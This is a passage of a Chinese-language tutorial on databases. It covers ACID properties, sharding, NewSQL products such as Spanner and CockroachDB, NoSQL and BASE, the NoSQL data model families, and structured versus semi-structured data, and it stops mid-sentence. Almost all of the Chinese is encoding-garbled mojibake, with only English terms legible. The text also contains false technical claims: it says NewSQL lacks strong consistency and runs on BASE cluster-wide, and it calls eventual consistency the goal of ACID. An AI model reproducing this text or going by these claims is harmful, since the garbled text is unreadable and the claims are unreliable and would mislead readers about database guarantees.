A(Atomicity)ÂéüÂ≠êÊÄßÂæàÂÆπÊòìÁêÜËß£Ôºå‰πüÂ∞±ÊòØËØ¥‰∫ãÂä°ÈáåÁöÑÊâÄÊúâÊìç‰ΩúË¶Å‰πàÂÖ®ÈÉ®ÂÅöÂÆåÔºåË¶Å‰πàÈÉΩ‰∏çÂÅöÔºå‰∫ãÂä°ÊàêÂäüÁöÑÊù°‰ª∂ÊòØ‰∫ãÂä°ÈáåÁöÑÊâÄÊúâÊìç‰ΩúÈÉΩÊàêÂäüÔºåÂè™Ë¶ÅÊúâ‰∏Ä‰∏™Êìç‰ΩúÂ§±Ë¥•ÔºåÊï¥‰∏™‰∫ãÂä°Â∞±Â§±Ë¥•ÔºåÈúÄË¶ÅÂõûÊªö„ÄÇÊØîÂ¶ÇÈì∂Ë°åËΩ¨Ë¥¶Ôºå‰ªéAË¥¶Êà∑ËΩ¨100ÂÖÉËá≥BË¥¶Êà∑ÔºåÂàÜ‰∏∫‰∏§‰∏™Ê≠•È™§Ôºö1Ôºâ‰ªéAË¥¶Êà∑Âèñ100ÂÖÉÔºõ2ÔºâÂ≠òÂÖ•100ÂÖÉËá≥BË¥¶Êà∑„ÄÇËøô‰∏§Ê≠•Ë¶Å‰πà‰∏ÄËµ∑ÂÆåÊàêÔºåË¶Å‰πà‰∏ÄËµ∑‰∏çÂÆåÊàêÔºåÂ¶ÇÊûúÂè™ÂÆåÊàêÁ¨¨‰∏ÄÊ≠•ÔºåÁ¨¨‰∫åÊ≠•Â§±Ë¥•ÔºåÈí±‰ºöËé´ÂêçÂÖ∂Â¶ôÂ∞ë‰∫Ü100ÂÖÉ„ÄÇ C(Consistency)‰∏ÄËá¥ÊÄß‰πüÊØîËæÉÂÆπÊòìÁêÜËß£Ôºå‰πüÂ∞±ÊòØËØ¥Êï∞ÊçÆÂ∫ìË¶Å‰∏ÄÁõ¥Â§Ñ‰∫é‰∏ÄËá¥ÁöÑÁä∂ÊÄÅÔºå‰∫ãÂä°ÁöÑËøêË°å‰∏ç‰ºöÊîπÂèòÊï∞ÊçÆÂ∫ìÂéüÊú¨ÁöÑ‰∏ÄËá¥ÊÄßÁ∫¶Êùü„ÄÇ‰æãÂ¶ÇÁé∞ÊúâÂÆåÊï¥ÊÄßÁ∫¶Êùüa+b=10ÔºåÂ¶ÇÊûú‰∏Ä‰∏™‰∫ãÂä°ÊîπÂèò‰∫ÜaÔºåÈÇ£‰πàÂøÖÈ°ªÂæóÊîπÂèòbÔºå‰ΩøÂæó‰∫ãÂä°ÁªìÊùüÂêé‰æùÁÑ∂Êª°Ë∂≥a+b=10ÔºåÂê¶Âàô‰∫ãÂä°Â§±Ë¥•„ÄÇ I(Isolation)ÊâÄË∞ìÁöÑÁã¨Á´ãÊÄßÊòØÊåáÂπ∂ÂèëÁöÑ‰∫ãÂä°‰πãÈó¥‰∏ç‰ºö‰∫íÁõ∏ÂΩ±ÂìçÔºåÂ¶ÇÊûú‰∏Ä‰∏™‰∫ãÂä°Ë¶ÅËÆøÈóÆÁöÑÊï∞ÊçÆÊ≠£Âú®Ë¢´Âè¶Â§ñ‰∏Ä‰∏™‰∫ãÂä°‰øÆÊîπÔºåÂè™Ë¶ÅÂè¶Â§ñ‰∏Ä‰∏™‰∫ãÂä°Êú™Êèê‰∫§ÔºåÂÆÉÊâÄËÆøÈóÆÁöÑÊï∞ÊçÆÂ∞±‰∏çÂèóÊú™Êèê‰∫§‰∫ãÂä°ÁöÑÂΩ±Âìç„ÄÇÊØîÂ¶ÇÁé∞ÊúâÊúâ‰∏™‰∫§ÊòìÊòØ‰ªéAË¥¶Êà∑ËΩ¨100ÂÖÉËá≥BË¥¶Êà∑ÔºåÂú®Ëøô‰∏™‰∫§ÊòìËøòÊú™ÂÆåÊàêÁöÑÊÉÖÂÜµ‰∏ãÔºåÂ¶ÇÊûúÊ≠§Êó∂BÊü•ËØ¢Ëá™Â∑±ÁöÑË¥¶Êà∑ÔºåÊòØÁúã‰∏çÂà∞Êñ∞Â¢ûÂä†ÁöÑ100ÂÖÉÁöÑ„ÄÇ D(Durability)ÊåÅ‰πÖÊÄßÊòØÊåá‰∏ÄÊó¶‰∫ãÂä°Êèê‰∫§ÂêéÔºåÂÆÉÊâÄÂÅöÁöÑ‰øÆÊîπÂ∞Ü‰ºöÊ∞∏‰πÖÁöÑ‰øùÂ≠òÂú®Êï∞ÊçÆÂ∫ì‰∏äÔºåÂç≥‰ΩøÂá∫Áé∞ÂÆïÊú∫‰πü‰∏ç‰ºö‰∏¢Â§±„ÄÇÊØîÂ¶ÇAË¥¶Êà∑Êî∂Âà∞‰∫Ü100ÂÖÉÂà∞Ë¥¶, Âè™Ë¶ÅÂà∞Ë¥¶Ëøô‰∏™‰∫ãÁâ©ÂÆåÊàê, Êï∞ÊçÆÂ∞±Â∑≤ÁªèÂà∞Êï∞ÊçÆÂ∫ìÈáåÈù¢‰∫Ü, Âç≥‰ΩøÊ≠§Êó∂ÂÆïÊú∫ÂØπAÁî®Êà∑ÁöÑËµÑ‰∫ß‰πüÊ≤°ÊúâÂΩ±Âìç„ÄÇ ÂÖ∏ÂûãÁöÑ‰∫ßÂìÅ ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìËØûÁîü40Â§öÂπ¥‰∫ÜÔºå‰ªéÁêÜËÆ∫‰∫ßÁîüÂèëÂ±ïÂà∞Áé∞ÂÆû‰∫ßÂìÅ, RDBMSÂæàÂ§ö‰∫ßÂìÅÂ∫îËØ•ÈÉΩÊòØËÄ≥ÁÜüËÉΩËØ¶ÁöÑ: Oracle MySQL PostgreSQL SQLServer Â§ßÊï∞ÊçÆÂ≠òÂÇ®Êó∂Èù¢‰∏¥ÁöÑÈóÆÈ¢ò ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ì‰∏•Ê†ºACIDÂéüÂàô, Âõ†Ê≠§Âú®Êâ©Â±ïÊÄß‰∏äË°®Áé∞‰∏çÊòØÁâπÂà´Â•Ω, Èù¢ÂØπÂ§ßËßÑÊ®°ÁöÑÊï∞ÊçÆÊó∂, Âú®ËØªÂíåÂÜô‰∏äÈù¢‰ºöÂá∫Áé∞‰∏•ÈáçÁì∂È¢à„ÄÇÊÉ≥Ë¶ÅÊèêÂçáÂÖ∂ÊÄßËÉΩ, ÂæÄÂæÄÈúÄË¶Å‰ªé‰∏öÂä°Â±ÇËøõË°åÂ§ÑÁêÜ, ËøõË°åÊï∞ÊçÆÁöÑSharding„ÄÇshardingÊúâ2‰∏™Áª¥Â∫¶: Ê∞¥Âπ≥ÂàáÂàÜÂíåÂûÇÁõ¥ÂàáÂàÜ: Ê∞¥Âπ≥ÂàáÂàÜ: Ê†πÊçÆË°®‰∏≠ÁöÑÊï∞ÊçÆÁöÑÈÄªËæëÂÖ≥Á≥ªÔºåÂ∞ÜÂêå‰∏ÄÂº†Ë°®ÁöÑÊï∞ÊçÆÔºåÊåâÁÖßÊüêÁßçÊù°‰ª∂ÂàáÂàÜÂà∞‰∏çÂêåÁöÑÊï∞ÊçÆÂ∫ì‰∏ªÊú∫‰∏ä ÂûÇÁõ¥ÂàáÂàÜ: ÊåâÁÖß‰∏çÂêåÁöÑË°®ÊàñËÄÖschemaÔºåÊù•ÂàáÂàÜÂà∞‰∏çÂêåÁöÑÊï∞ÊçÆÂ∫ì‰∏ªÊú∫‰∏ä ÂàáÁâá(sharding)‰ºöÂ¢ûÂä†Êï¥‰∏™Á≥ªÁªüÁöÑÂ§çÊùÇÊÄßÔºåËÄå‰∏îÂàáÁâáÊú¨Ë∫´‰πüÊòØ‰∏Ä‰∏™ÂæàÂ§çÊùÇÁöÑËøáÁ®ãÔºå‰∏éÂ∫îÁî®Êú¨Ë∫´ÊúâËøôÂØÜÂàáÁöÑÂÖ≥Á≥ªÔºåÊâÄ‰ª•ÂØπ‰∫é‰∏ç‰ΩÜÂ¢ûÂ§ßÁöÑÊï∞ÊçÆËÄåË®ÄÔºåÂàáÁâáÂπ∂‰∏çËÉΩ‰ªéÊ†πÊú¨‰∏äËß£ÂÜ≥Â§ßÊï∞ÊçÆÂ≠òÂÇ®ÈóÆÈ¢ò„ÄÇ NewSQL‰º†ÁªüÁöÑÂÖ≥Á≥ªÂûãÊï∞ÊçÆÊÉ≥Ë¶ÅÂÅöÂà∞È´òÊâ©Â±ï, È´òÊÄßËÉΩ, È´òÂèØÈù†ÊÄßÊòØÂæàÂ§çÊùÇÁöÑ, ‰ΩÜÊòØÂΩì‰Ω†ÁöÑÁ°ÆÊÉ≥Ë¶Å‰∏ÄÁßçËøôÁßçÊ†∑ÁöÑÊï∞ÊçÆÂ∫ìÊó∂, NewSQLÂèØËÉΩÊòØ‰Ω†‰∏ÄÁßç‰∏çÈîôÁöÑÈÄâÊã©„ÄÇ ‰ªÄ‰πàÊòØNewSQLÔºü ËøôÊòØ‰∏Ä‰∏™‰∏≠Èó¥‰∫ßÁâ©, ÊòØ‰∏ÄÁßçÂÆåÂÖ®‰∏çÂêåÁöÑÊï∞ÊçÆÂ∫ìÊû∂ÊûÑ, NewSQLÊúØËØ≠ÊúÄÊó©Âú®2011Âπ¥Áî±Matthew AslettÂàõÈÄ†, NewSQLÁöÑËÆæËÆ°Á´ãË∂≥‰∫é‰º†ÁªüÁöÑÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÔºå‰ΩÜÊòØÂêåÊó∂‰πüÂºïËøõ‰∏Ä‰∫õÊñ∞ÊäÄÊúØÔºå‰ªéËÄåËææÂà∞ÂèØÊâ©Â±ïÂíåÈ´òÊÄßËÉΩÁöÑÁõÆÁöÑ, ËÄåÁº∫ÁÇπÊòØÊ≤°ÊúâÊèê‰æõÂº∫‰∏ÄËá¥ÊÄß, ÂÆÉ‰ª¨‰∏çÂèØ‰ª•Ë¢´‰ΩøÁî®Âú®Âº∫‰∏ÄËá¥ÊÄßÁéØÂ¢É‰∏ã„ÄÇNewSQLÂÖ∑ÊúâNoSQLÁöÑÊµ∑ÈáèÊï∞ÊçÆÂ≠òÂÇ®ÁÆ°ÁêÜËÉΩÂäõ,ÂêåÊó∂ËøòÊîØÊåÅ‰º†ÁªüÊï∞ÊçÆÂ∫ìÁöÑACIDÂíåSQLËÉΩÂäõ(Âçï‰∏™ËäÇÁÇπ‰∏äÁöÑACIDËÉΩÂäõ), ‰ΩÜÊòØÂú®Áé∞ÂÆû‰ΩøÁî®‰∏≠ËøòÊ≤°ÊôÆÂèäÂºÄÊù•, ËøòÊ≤°Ë¢´Â§ßËßÑÊ®°‰ΩøÁî®„ÄÇ NewSQLÁöÑÁâπÁÇπ NewSQLÂÖ∑‰ΩìÂíåRDBMS‰∏ÄÊ†∑ÁöÑÂçï‰∏™ËäÇÁÇπ‰∏äÁöÑACIDËÉΩÂäõ, ÂêåÊó∂ÂèàÂÖ∑ÊúâNoSQL‰∏ÄÊ†∑ÁöÑÂæàÂº∫ÁöÑÊâ©Â±ïËÉΩÂäõ(ÂÆÉÂú®Êï¥‰∏™ÈõÜÁæ§‰∏äÈÅµÂæ™BASEËßÑÂàô, ÂÖ≥‰∫éBASEÂú®ÂêéÈù¢NoSQL‰∏≠ÂÜçÂÅö‰ªãÁªç)„ÄÇ ÂÖ∏ÂûãÁöÑNewSQL‰∫ßÂìÅ ÊàëËøÑ‰ªä‰πüÊ≤°Êúâ‰ΩøÁî®ËøáNewSQL‰∫ßÂìÅ, ‰ª•‰∏ãÊòØÊàëÊâÄÁü•ÁöÑÂÖ≥‰∫éNewSQLÁöÑÁªèÂÖ∏‰∫ßÂìÅ: Google spanner: GoogleÁöÑÂÖ®ÁêÉÁ∫ßÁöÑÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ∫ì(Globally-Distributed Database) CockroachDB: ÂèÇËÄÉGoole spannerÂÆûÁé∞ÁöÑÂºÄÊ∫êÁâà Â¶Ç‰ΩïËß£ÂÜ≥Â§ßÊï∞ÊçÆÂ≠òÂÇ®ÈóÆÈ¢òÔºü NewSQLÂü∫‰∫éNoSQLÁöÑBASEÂéüÂàô, ÊûÑÂª∫ÂèØ‰ª•Ê®™ÂêëÊâ©Â±ïÁöÑÂàÜÂ∏ÉÂºèÁ≥ªÁªüÊù•Ëß£ÂÜ≥Â§ßÊï∞ÊçÆÁöÑÂ≠òÂÇ®ÂíåÁÆ°ÁêÜÈóÆÈ¢ò„ÄÇ NoSQL‰ªäÂ§©Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÁ¨¨‰∏âÊñπÂπ≥Âè∞(Â¶ÇÔºöGoogle,FacebookÁ≠â), ÂèØ‰ª•ÂæàÂÆπÊòìÁöÑËÆøÈóÆÂíåÊäìÂèñÊï∞ÊçÆ„ÄÇÁî®Êà∑ÁöÑ‰∏™‰∫∫‰ø°ÊÅØÔºåÁ§æ‰∫§ÁΩëÁªúÔºåÂú∞ÁêÜ‰ΩçÁΩÆÔºåÁî®Êà∑ÁîüÊàêÁöÑÊï∞ÊçÆÂíåÁî®Êà∑Êìç‰ΩúÊó•ÂøóÂ∑≤ÁªèÊàêÂÄçÁöÑÂ¢ûÂä†„ÄÇÊàë‰ª¨Â¶ÇÊûúË¶ÅÂØπËøô‰∫õÁî®Êà∑Êï∞ÊçÆËøõË°åÊåñÊéòÔºåÈÇ£SQLÊï∞ÊçÆÂ∫ìÂ∑≤Áªè‰∏çÈÄÇÂêàËøô‰∫õÂ∫îÁî®‰∫Ü, NoSQLÊï∞ÊçÆÂ∫ìÁöÑÂèëÂ±ï‰πüÂç¥ËÉΩÂæàÂ•ΩÁöÑÂ§ÑÁêÜËøô‰∫õÂ§ßÁöÑÊï∞ÊçÆ„ÄÇ ‰ªÄ‰πàÊòØNoSQLÔºü NoSQL(NoSQL = Not Only SQL)ÔºåÊÑèÂç≥‚Äú‰∏ç‰ªÖ‰ªÖÊòØSQL‚ÄùÔºåÊòØ‰∏ÄÈ°πÂÖ®Êñ∞ÁöÑÊï∞ÊçÆÂ∫ìÈù©ÂëΩÊÄßËøêÂä®ÔºåÊó©ÊúüÂ∞±Êúâ‰∫∫ÊèêÂá∫ÔºåÂèëÂ±ïËá≥2009Âπ¥Ë∂ãÂäøË∂äÂèëÈ´òÊ∂®„ÄÇNoSQLÁöÑÊã•Êä§ËÄÖ‰ª¨ÊèêÂÄ°ËøêÁî®ÈùûÂÖ≥Á≥ªÂûãÁöÑÊï∞ÊçÆÂ≠òÂÇ®ÔºåÁõ∏ÂØπ‰∫éÈì∫Â§©ÁõñÂú∞ÁöÑÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìËøêÁî®ÔºåËøô‰∏ÄÊ¶ÇÂøµÊó†ÁñëÊòØ‰∏ÄÁßçÂÖ®Êñ∞ÁöÑÊÄùÁª¥ÁöÑÊ≥®ÂÖ• NoSQLÁöÑÁâπÁÇπ(BASE) BASEÁöÑÂÖ®Áß∞ÊòØBasically Available, Soft-state, Eventually Consistent„ÄÇ Áî±Eric BrewerÂÆö‰πâ„ÄÇACIDÂº∫Ë∞ÉÂº∫‰∏ÄËá¥ÊÄß(CAP‰∏≠ÁöÑC), ËÄåBASEÂàôÂº∫Ë∞ÉÂü∫Êú¨ÂèØÁî®ÊÄß(CAP‰∏≠ÁöÑAÔºâÔºåÂú®BASEÊÄùÊÉ≥ÁöÑÊâ©Â±ï‰∏ãÔºåÂ∞±Âá∫Áé∞‰∫ÜNoSQL„ÄÇBASEÊòØNoSQLÊï∞ÊçÆÂ∫ìÈÄöÂ∏∏ÂØπÂèØÁî®ÊÄßÂèä‰∏ÄËá¥ÊÄßÁöÑÂº±Ë¶ÅÊ±ÇÂéüÂàô: Basically Availble: Âü∫Êú¨ÂèØÁî® Soft-state: ËΩØÁä∂ÊÄÅ/ÊüîÊÄß‰∫ãÂä°„ÄÇ ‚ÄúSoft state‚Äù ÂèØ‰ª•ÁêÜËß£‰∏∫‚ÄùÊó†ËøûÊé•‚ÄùÁöÑ, ËÄå ‚ÄúHard state‚Äù ÊòØ‚ÄùÈù¢ÂêëËøûÊé•‚ÄùÁöÑ Eventual Consistency: ÊúÄÁªà‰∏ÄËá¥ÊÄß ÊúÄÁªà‰∏ÄËá¥ÊÄßÔºå ‰πüÊòØÊòØ ACID ÁöÑÊúÄÁªàÁõÆÁöÑ„ÄÇ BASEÊòØÁõ∏ÂØπACIDËÄåË®ÄÁöÑ, ‰∏ãÈù¢ÊòØÂØπÊØîË°®: ACID BASE AÂéüÂ≠êÊÄß(Atomicity) Âü∫Êú¨ÂèØÁî®(Basically Available) ‰∏ÄËá¥ÊÄß(Consistency) ËΩØÁä∂ÊÄÅ/ÊüîÊÄß‰∫ãÂä°(Soft state) ÈöîÁ¶ªÊÄß(Isolation) ÊúÄÁªà‰∏ÄËá¥ÊÄß (Eventual consistency) ÊåÅ‰πÖÊÄß (Durable) ÊîØÊåÅ ÂÖ∏ÂûãÁöÑNoSQL‰∫ßÂìÅ NoSQLÊòØÂÆûÁé∞ÊñπÂºèÂêÑ‰∏çÁõ∏ÂêåÔºå‰∏ãÈù¢‰∏ªË¶Å‰ªãÁªç ‰∏ªÊµÅÁöÑNoSQLÊµÅÊ¥æ, ÊÉ≥Ë¶Å‰∫ÜËß£Êõ¥ÂÖ∑‰ΩìÁöÑ‰ø°ÊÅØËØ∑ÁÇπÂáªÂÖ≥‰∫éÊâÄÊúâNoSQL‰ªãÁªçÁöÑ‰∏Ä‰∏™ÁΩëÁ´ô: ÂàóÂºèÊï∞ÊçÆÊ®°ÂûãÊï∞ÊçÆÊ®°ÂûãÔºö ÁúãÂà∞‰πüÊòØË°®, ‰ΩÜÊòØ‰∏çÊîØÊåÅÈìæÊé•Êü•ËØ¢, Âõ†‰∏∫Êï∞ÊçÆÂ≠òÂÇ®‰ª•Âàó‰∏∫Âçï‰Ωç(column), ËÄåÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÊòØ‰ª•Ë°å‰∏∫Â≠òÂÇ®Âçï‰ΩçÁöÑÂ∫îÁî®Âú∫ÊôØÔºö Âú®ÂàÜÂ∏ÉÂºèÊñá‰ª∂Á≥ªÁªü‰πã‰∏äÊèê‰æõÊîØÊåÅÈöèÊú∫ËØªÂÜôÁöÑÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ≠òÂÇ®ÂÖ∏Âûã‰∫ßÂìÅÔºö Hbase„ÄÅ Hypertable„ÄÅ Bigtable„ÄÅ Cassandra‰ºòÁÇπÔºö Âø´ÈÄüÊü•ËØ¢„ÄÅ È´òÊâ©Â±ïÊÄß„ÄÅÊòì‰∫éÂÆûÁé∞ÂàÜÂ∏ÉÂºèÊâ©Â±ï ÊñáÊ°£Êï∞ÊçÆÊ®°Âûã ÔºöÊï∞ÊçÆÊ®°ÂûãÔºö ‰ªã‰∫éÈîÆÂÄºÂ≠òÂÇ®kv)ÂíåÂÖ≥Á≥ªÂûãÂ≠òÂÇ®(row),ÊØè‰∏ÄË°åÊï∞ÊçÆÁªÑÁªá‰∏∫‰∏Ä‰∏™ÊñáÊ°£, ‰ª•ÊñáÊ°£‰∏∫Â≠òÂÇ®Âçï‰ΩçÂ∫îÁî®Âú∫ÊôØÔºö ÈùûÂº∫‰∫ãÁâ©ÈúÄÊ±ÇÁöÑwebÂ∫îÁî®ÂÖ∏Âûã‰∫ßÂìÅÔºö MongoDB„ÄÅ ElasticSearch(ÂºπÊÄßÊêúÁ¥¢ÔºåÂ≠òÂÇ®webÊó•Âøó)‰ºòÁÇπÔºö Êï∞ÊçÆÊ®°ÂûãÊó†ÈúÄ‰∫ãÂÖàÂÆö‰πâ ÈîÆÂÄºÊï∞ÊçÆÊ®°Âûã ÔºöÊï∞ÊçÆÊ®°ÂûãÔºö Ê®°ÂûãÁÆÄÂçï, Êòì‰∫éÂÆûÁé∞, Êìç‰ΩúÁÆÄÂçï(get set del)Â∫îÁî®Âú∫ÊôØÔºö ÂÜÖÂÆπÁºìÂ≠ò, Áî®‰∫éÂ§ßÈáèÂπ∂Ë°åÊï∞ÊçÆËÆøÈóÆ, È´òË¥üËΩΩÂú∫ÊôØÂ∫îÁî®‰∫ßÂìÅÔºö DynamoDB, Riak, Redis‰ºòÁÇπÔºö hashÁöÑ‰ºòÁÇπÔºå Êü•ËØ¢ËøÖÈÄü ÂõæÂºèÊï∞ÊçÆÊ®°Âûã ÔºöÊï∞ÊçÆÊ®°ÂûãÔºö ÂõæÂºèÁªìÊûÑÂ∫îÁî®Âú∫ÊôØÔºö Á§æ‰∫§ÁΩëÁªú„ÄÅ Êé®ËçêÁ≥ªÁªü„ÄÅ ÂÖ≥Á≥ªÂõæË∞±ÂÖ∏Âûã‰∫ßÂìÅÔºö Neo4J‰ºòÁÇπÔºö ÈÄÇÁî®‰∫éÂõæÂºèÊäÄÊúØÂú∫ÊôØ Â¶Ç‰ΩïËß£ÂÜ≥Â§ßÊï∞ÊçÆÂ≠òÂÇ®ÈóÆÈ¢òÔºü ÈÄöËøáÂàÜÂ∏ÉÂºèËß£ÂÜ≥ RDBMS vs NoSQLRDBMSÁöÑÁâπÁÇπ: È´òÂ∫¶ÁªÑÁªáÂåñÁªìÊûÑÂåñÊï∞ÊçÆ ÁªìÊûÑÂåñÊü•ËØ¢ËØ≠Ë®Ä Êï∞ÊçÆÂíåÂÖ≥Á≥ªÈÉΩÂ≠òÂÇ®Âú®ÂçïÁã¨ÁöÑË°®‰∏≠„ÄÇ Êï∞ÊçÆÊìçÁ∫µËØ≠Ë®ÄÔºåÊï∞ÊçÆÂÆö‰πâËØ≠Ë®Ä ‰∏•Ê†ºÁöÑ‰∏ÄËá¥ÊÄß Âü∫‰∫é‰∫ãÂä° NoSQLÁöÑÁâπÁÇπ: ‰ª£Ë°®ÁùÄ‰∏ç‰ªÖ‰ªÖÊòØSQL Ê≤°ÊúâÂ£∞ÊòéÊÄßÊü•ËØ¢ËØ≠Ë®Ä Ê≤°ÊúâÈ¢ÑÂÆö‰πâÁöÑÊ®°Âºè, Êû∂ÊûÑÁöÑÁÅµÊ¥ªÊÄßÔºåÊîØÊåÅÂçäÁªìÊûÑÂåñÊï∞ÊçÆ ÈîÆÂÄºÂØπÂ≠òÂÇ®ÔºåÂàóÂ≠òÂÇ®ÔºåÊñáÊ°£Â≠òÂÇ®ÔºåÂõæÂΩ¢Êï∞ÊçÆÂ∫ì ÊúÄÁªà‰∏ÄËá¥ÊÄßÔºåËÄåÈùûACIDÂ±ûÊÄß ÈùûÁªìÊûÑÂåñÂíå‰∏çÂèØÈ¢ÑÁü•ÁöÑÊï∞ÊçÆ ÂàÜÂ∏ÉÂºèËÆ°ÁÆó, CAPÂÆöÁêÜ È´òÊÄßËÉΩÔºåÈ´òÂèØÁî®ÊÄßÂíåÂèØ‰º∏Áº©ÊÄß, È´òÊ∞¥Âπ≥Êâ©Â±ïËÉΩÂäõÂíå‰ΩéÊàêÊú¨ÁöÑ‰ΩéÁ´ØÁ°¨‰ª∂ÈõÜÁæ§ ÂäüËÉΩÁõ∏ÂØπÁÆÄÂçï, Ê≤°ÊúâÁªü‰∏ÄÁöÑÊü•ËØ¢ËØ≠Ë®Ä, ÊúâÈôêÁöÑÊü•ËØ¢ÂäüËÉΩ ÊúÄÁªà‰∏ÄËá¥ÊòØ‰∏çÁõ¥ËßÇÁöÑÁ®ãÂ∫è Êï∞ÊçÆÊ®°ÂûãÂØπ‰∫éÊï∞ÊçÆÊú¨Ë∫´ËÄåË®Ä, Êàë‰ª¨ÂæÄÂæÄÂ∞ÜÂÖ∂ÂàÜ‰∏∫ÁªìÊûÑÂåñÊï∞ÊçÆ, ÂçäÁªìÊûÑÂåñÊï∞ÊçÆ, ‰ª•ÂèäÈùûÁªìÊûÑÂåñÊï∞ÊçÆ, ‰ΩÜÊòØÂØπ‰∫éÂÇ®Â≠òÊó∂Êï∞ÊçÆÁöÑÁªÑÁªáÊàë‰ª¨ÊâçÁß∞ÂÖ∂‰∏∫Êï∞ÊçÆÊ®°Âûã, Â∏∏ËßÅÁöÑÊï∞ÊçÆÊ®°ÂûãÊúâ: ÂÖ≥Á≥ªÊ®°Âûã, ÊñáÊ°£Ê®°Âûã, ÂÅ•ÂÄºÊ®°Âûã, ‰ª•ÂèäÂàóÂºèÊ®°Âºè„ÄÇ Áî®Êà∑‰æßÊï∞ÊçÆÈöèÁùÄÁΩëÁªúÊäÄÊúØÁöÑÂèëÂ±ïÔºåÁâπÂà´ÊòØInternetÂíåIntranetÊäÄÊúØÁöÑÈ£ûÂø´ÂèëÂ±ïÔºå‰ΩøÂæóÈùûÁªìÊûÑÂåñÊï∞ÊçÆÁöÑÊï∞ÈáèÊó•Ë∂ãÂ¢ûÂ§ß„ÄÇËøôÊó∂Ôºå‰∏ªË¶ÅÁî®‰∫éÁÆ°ÁêÜÁªìÊûÑÂåñÊï∞ÊçÆÁöÑÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÁöÑÂ±ÄÈôêÊÄßÊö¥Èú≤Âú∞Ë∂äÊù•Ë∂äÊòéÊòæ„ÄÇÂõ†ËÄåÔºåÊï∞ÊçÆÂ∫ìÊäÄÊúØÁõ∏Â∫îÂú∞ËøõÂÖ•‰∫Ü‚ÄúÂêéÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÊó∂‰ª£‚ÄùÔºåÂèëÂ±ïËøõÂÖ•Âü∫‰∫éÁΩëÁªúÂ∫îÁî®ÁöÑÈùûÁªìÊûÑÂåñÊï∞ÊçÆÂ∫ìÊó∂‰ª£„ÄÇ ÁªìÊûÑÂåñÊï∞ÊçÆ(structured data) ÁªìÊûÑÂåñÊï∞ÊçÆ, Âç≥Ë°åÊï∞ÊçÆ,Â≠òÂÇ®Âú®Êï∞ÊçÆÂ∫ìÈáå,ÂèØ‰ª•Áî®‰∫åÁª¥Ë°®ÁªìÊûÑÊù•ÈÄªËæëË°®ËææÂÆûÁé∞ÁöÑÊï∞ÊçÆ„ÄÇÁªìÊûÑÂåñÊï∞ÊçÆ, ÂÖàÁü•ÁªìÊûÑ, ÂÜçÊúâÊï∞ÊçÆ„ÄÇ Êàë‰ª¨Ê†πÊçÆÊï∞ÊçÆÁöÑÁªìÊûÑÈ¢ÑÂÖàÂª∫Á´ãÂ•Ω‰∫åÁª¥Ë°®, Á≠âÊï∞ÊçÆÊù•ÁöÑÊó∂ÂÄô, Â°´ÂÖ•Âç≥ÂèØ„ÄÇÂõ†Ê≠§ÁªìÊûÑÂåñÁöÑÊï∞ÊçÆÂæÄÂæÄÊòØÂèØÂª∫Ê®°, Ê†áÂáÜÂåñÁöÑÊï∞ÊçÆ, ÁªìÊûÑÂåñÁöÑÊï∞ÊçÆÂæàÊñπ‰æøÁ®ãÂ∫è‰ΩøÁî®, Âõ†‰∏∫ÁªìÊûÑÂ∑≤Áü•„ÄÇ ÁªìÊûÑÂåñÊï∞ÊçÆÊúÄÂ§ßÁöÑÈóÆÈ¢ò, Â∞±ÂΩìÊï∞ÊçÆÁöÑÁªìÊûÑÂèëÁîüÂèòÂåñÊó∂, Êàë‰ª¨ÈúÄË¶ÅË∞ÉÊï¥Êï∞ÊçÆÁöÑÁªìÊûÑ, ‰∏ÄËà¨Â∞±ÊÑèÂë≥ÁùÄÊï∞ÊçÆÂ∫ìË°®ÁªìÊûÑÁöÑÈúÄË¶ÅÂèòÂä®„ÄÇËøô‰ΩøÂæóÊï∞ÊçÆÂú®Â≠òÂÇ®Êó∂Êúâ‰∏•Ê†ºÁöÑË¶ÅÊ±Ç(ÈúÄË¶ÅÂÆö‰πâschema)„ÄÇÁªìÊûÑÂåñÊï∞ÊçÆ: ÂèØ‰ª•Ë¢´ÊèêÂâçÂª∫Ê®°ÁöÑÊï∞ÊçÆ(ÂÆö‰πâschema) ÂçäÁªìÊûÑÂåñÊï∞ÊçÆ(semi-structured data) ÊâÄË∞ìÂçäÁªìÊûÑÂåñÊï∞ÊçÆÔºåÂ∞±ÊòØ‰ªã‰∫éÂÆåÂÖ®ÁªìÊûÑÂåñÊï∞ÊçÆ(Â¶ÇÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ì„ÄÅÈù¢ÂêëÂØπË±°Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊï∞ÊçÆ)ÂíåÂÆåÂÖ®Êó†ÁªìÊûÑÁöÑÊï∞ÊçÆ(Â¶ÇÂ£∞Èü≥„ÄÅÂõæÂÉèÊñá‰ª∂Á≠â)‰πãÈó¥ÁöÑÊï∞ÊçÆÔºåHTMLÊñáÊ°£Â∞±Â±û‰∫éÂçäÁªìÊûÑÂåñÊï∞ÊçÆ„ÄÇÂÆÉ‰∏ÄËà¨ÊòØËá™ÊèèËø∞ÁöÑÔºåÊï∞ÊçÆÁöÑÁªìÊûÑÂíåÂÜÖÂÆπÊ∑∑Âú®‰∏ÄËµ∑ÔºåÊ≤°ÊúâÊòéÊòæÁöÑÂå∫ÂàÜ„ÄÇÊâÄ‰ª•ÂØπ‰∫éÂçäÁªìÊûÑÂåñÁöÑÊï∞ÊçÆ, Êï∞ÊçÆÁöÑÁªìÊûÑË¶ÅÁ≠âÊï∞ÊçÆËé∑ÂæóÂêéÊâçÁü•ÈÅì, ‰πüÂ∞±ÊòØÂÖàÊúâÊï∞ÊçÆ, ÂêéÁü•ÁªìÊûÑ„ÄÇÊï¥‰∏™‰∫íËÅîÁΩë‰∏äËøôÁ±ªÊï∞ÊçÆÊòØÂæàÂ§öÁöÑ, Âõ†‰∏∫htmlÂ∞±ÊòØÂçäÁªìÊûÑÂåñÁöÑÊï∞ÊçÆ„ÄÇ Áõ∏ÂØπ‰∫éÁªìÊûÑÂåñÁöÑÊï∞ÊçÆ, 